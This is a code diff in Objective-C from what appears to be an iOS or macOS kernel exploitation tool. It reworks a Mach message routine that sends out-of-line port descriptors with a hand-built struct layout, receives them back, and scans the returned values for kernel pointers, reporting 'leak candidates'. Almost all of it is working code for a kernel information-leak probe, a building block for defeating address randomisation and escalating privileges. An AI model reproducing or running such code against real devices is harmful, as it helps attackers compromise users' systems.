@@ -8493,7 +8493,6 @@ static void *iohid_threadCopyEvent(void *arg) {
         kern_return_t kr;
 
         // Step 1: Create multiple ports for OOL array
-        // Each slot needs a real port right so kernel copies non-null pointers
         const mach_msg_size_t PORT_COUNT = 8;
         mach_port_t ports[PORT_COUNT];
         memset(ports, 0, sizeof(ports));
@@ -8502,9 +8501,8 @@ static void *iohid_threadCopyEvent(void *arg) {
             if (kr != KERN_SUCCESS) {
                 [self appendLog:[NSString stringWithFormat:
                     @"port_allocate[%d] failed: %s (0x%x)", i, mach_error_string(kr), kr]];
-                for (mach_msg_size_t j = 0; j < i; j++) {
+                for (mach_msg_size_t j = 0; j < i; j++)
                     mach_port_destroy(mach_task_self(), ports[j]);
-                }
                 return;
             }
             kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
@@ -8512,37 +8510,64 @@ static void *iohid_threadCopyEvent(void *arg) {
             if (kr != KERN_SUCCESS) {
                 [self appendLog:[NSString stringWithFormat:
                     @"insert_right[%d] failed: %s (0x%x)", i, mach_error_string(kr), kr]];
-                for (mach_msg_size_t j = 0; j <= i; j++) {
+                for (mach_msg_size_t j = 0; j <= i; j++)
                     mach_port_destroy(mach_task_self(), ports[j]);
-                }
                 return;
             }
         }
         [self appendLog:[NSString stringWithFormat:
             @"Created %d ports with send rights", PORT_COUNT]];
 
-        // Create dedicated receive port for this message
+        // Create dedicated receive port
         mach_port_t recvPort = MACH_PORT_NULL;
         kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recvPort);
         if (kr != KERN_SUCCESS) {
-            [self appendLog:[NSString stringWithFormat:
-                @"recv port alloc: %s", mach_error_string(kr)]];
+            [self appendLog:[NSString stringWithFormat:@"recv port alloc: %s", mach_error_string(kr)]];
             for (int j = 0; j < PORT_COUNT; j++) mach_port_destroy(mach_task_self(), ports[j]);
             return;
         }
         kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort,
             MACH_MSG_TYPE_MAKE_SEND);
 
-        // Step 2: Build OOL ports descriptor message
+        // Step 2: Build message with OOL ports descriptor (manual layout)
+        // Kernel expects mach_msg_descriptor_type_t=3 for OOL_PORTS.
+        // Struct layout (arm64e): address(8) count(4) deallocate(1) pad(3)
+        //                         copy(4) disposition(4) type(4) = 28 bytes
         mach_port_t *oolArray = (mach_port_t *)calloc(PORT_COUNT, sizeof(mach_port_t));
         for (mach_msg_size_t i = 0; i < PORT_COUNT; i++) {
-            oolArray[i] = ports[i]; // send rights
+            oolArray[i] = ports[i];
         }
 
-        struct __attribute__((__packed__)) {
-            mach_msg_header_t               header;
-            mach_msg_body_t                 body;
-            mach_msg_ool_ports_descriptor_t ool;
+        typedef struct {
+            mach_msg_bits_t       msgh_bits;
+            mach_msg_size_t       msgh_size;
+            mach_port_t           msgh_remote_port;
+            mach_port_t           msgh_local_port;
+            mach_port_name_t      msgh_voucher_port;
+            mach_msg_id_t         msgh_id;
+        } kmsg_header_t;
+
+        typedef struct {
+            uint32_t msgh_descriptor_count;
+        } kmsg_body_t;
+
+        typedef struct {
+            void           *address;       // +0:  8 bytes
+            uint32_t        count;         // +8:  4 bytes
+            uint8_t         deallocate;    // +12: 1 byte
+            uint8_t         _pad[3];       // +13: 3 bytes padding
+            uint32_t        copy;          // +16: 4 bytes
+            uint32_t        disposition;   // +20: 4 bytes
+            uint32_t        type;          // +24: 4 bytes
+        } __attribute__((packed)) ool_ports_desc_t;
+
+        // MACH_MSG_OOL_PORTS_DESCRIPTOR = 3 in kernel
+        enum { kOolPortsDescType = 3 };
+
+        struct {
+            kmsg_header_t    header;
+            kmsg_body_t      body;
+            ool_ports_desc_t ool;
         } sendMsg;
 
         memset(&sendMsg, 0, sizeof(sendMsg));
@@ -8556,15 +8581,15 @@ static void *iohid_threadCopyEvent(void *arg) {
         sendMsg.body.msgh_descriptor_count = 1;
         sendMsg.ool.address     = oolArray;
         sendMsg.ool.count       = PORT_COUNT;
-        sendMsg.ool.deallocate  = FALSE;
+        sendMsg.ool.deallocate  = 0;
         sendMsg.ool.copy        = MACH_MSG_VIRTUAL_COPY;
         sendMsg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
-        sendMsg.ool.type        = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+        sendMsg.ool.type        = kOolPortsDescType;
 
-        // Step 3: Send the message to ourselves
-        kr = mach_msg(&sendMsg.header,
+        // Step 3: Send
+        kr = mach_msg((mach_msg_header_t *)&sendMsg,
                       MACH_SEND_MSG,
-                      sendMsg.header.msgh_size,
+                      sizeof(sendMsg),
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
@@ -8579,20 +8604,20 @@ static void *iohid_threadCopyEvent(void *arg) {
             return;
         }
 
-        // Step 4: Receive the message
-        struct __attribute__((__packed__)) {
-            mach_msg_header_t               header;
-            mach_msg_body_t                 body;
-            mach_msg_ool_ports_descriptor_t ool;
-            mach_msg_trailer_t              trailer;
+        // Step 4: Receive (with space for max-size trailer)
+        struct {
+            kmsg_header_t    header;
+            kmsg_body_t      body;
+            ool_ports_desc_t ool;
+            uint8_t          trailer[256];
         } recvMsg;
 
         memset(&recvMsg, 0, sizeof(recvMsg));
         recvMsg.header.msgh_local_port = recvPort;
         recvMsg.header.msgh_size       = sizeof(recvMsg);
 
-        kr = mach_msg(&recvMsg.header,
-                      MACH_RCV_MSG | MACH_RCV_LARGE,
+        kr = mach_msg((mach_msg_header_t *)&recvMsg,
+                      MACH_RCV_MSG,
                       0,
                       sizeof(recvMsg),
                       recvPort,
@@ -8609,7 +8634,7 @@ static void *iohid_threadCopyEvent(void *arg) {
             NSMutableString *report = [NSMutableString string];
             [report appendFormat:@"\nReceived %d port names at %p:\n\n", recvCount, recvArray];
 
-            // Raw hex dump
+            // Raw hex dump of first 64 bytes
             const uint8_t *raw = (const uint8_t *)recvArray;
             [report appendString:@"Raw hex (first 64 bytes):\n  "];
             for (int i = 0; i < MIN(64, (int)(recvCount * sizeof(mach_port_t))); i++) {
@@ -8619,16 +8644,16 @@ static void *iohid_threadCopyEvent(void *arg) {
             }
             [report appendString:@"\n\n"];
 
-            // Individual port names
+            // Scan individual port names for kernel address patterns
             int leakCount = 0;
             [report appendString:@"Port name scan:\n"];
             for (mach_msg_size_t j = 0; j < recvCount; j++) {
                 mach_port_t val = recvArray[j];
                 [report appendFormat:@"[%2d] 0x%08x", j, val];
 
-                uint32_t high = val >> 20;
-                if (high == 0xfffff || high == 0xffffe) {
-                    [report appendString:@" <-- HIGH32 kernel ptr?"];
+                uint32_t high12 = val >> 20;
+                if (high12 == 0xfffff || high12 == 0xffffe) {
+                    [report appendString:@" <-- HIGH32 kernel ptr!"];
                     leakCount++;
                 } else if (val > 0x80000000 && val != 0xFFFFFFFF) {
                     [report appendString:@" <-- suspicious"];
@@ -8639,17 +8664,17 @@ static void *iohid_threadCopyEvent(void *arg) {
                 [report appendString:@"\n"];
             }
 
-            // 64-bit pair analysis
+            // 64-bit pair reconstruction
             [report appendString:@"\n64-bit pair scan:\n"];
             for (mach_msg_size_t j = 0; j < recvCount - 1; j += 2) {
-                uint64_t pair = ((uint64_t)recvArray[j]) | ((uint64_t)recvArray[j+1] << 32);
-                if ((pair >> 40) == 0xfffffe || (pair >> 40) == 0xffffff) {
-                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j, j+1, pair];
+                uint64_t loHi = ((uint64_t)recvArray[j]) | ((uint64_t)recvArray[j+1] << 32);
+                if ((loHi >> 40) == 0xfffffe || (loHi >> 40) == 0xffffff) {
+                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j, j+1, loHi];
                     leakCount++;
                 }
-                uint64_t pair2 = ((uint64_t)recvArray[j+1]) | ((uint64_t)recvArray[j] << 32);
-                if ((pair2 >> 40) == 0xfffffe || (pair2 >> 40) == 0xffffff) {
-                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j+1, j, pair2);
+                uint64_t hiLo = ((uint64_t)recvArray[j+1]) | ((uint64_t)recvArray[j] << 32);
+                if ((hiLo >> 40) == 0xfffffe || (hiLo >> 40) == 0xffffff) {
+                    [report appendFormat:@"  [%d|%d] 0x%016llx <-- KERNEL POINTER!\n", j+1, j, hiLo];
                     leakCount++;
                 }
             }
@@ -8657,7 +8682,7 @@ static void *iohid_threadCopyEvent(void *arg) {
             [report appendFormat:@"\nLeak candidates: %d\n", leakCount];
             [self appendLog:report];
 
-            // Cleanup received OOL mapping
+            // Unmap received OOL data
             if (recvMsg.ool.address) {
                 vm_deallocate(mach_task_self(), (vm_address_t)recvMsg.ool.address,
                               recvMsg.ool.count * sizeof(mach_port_t));
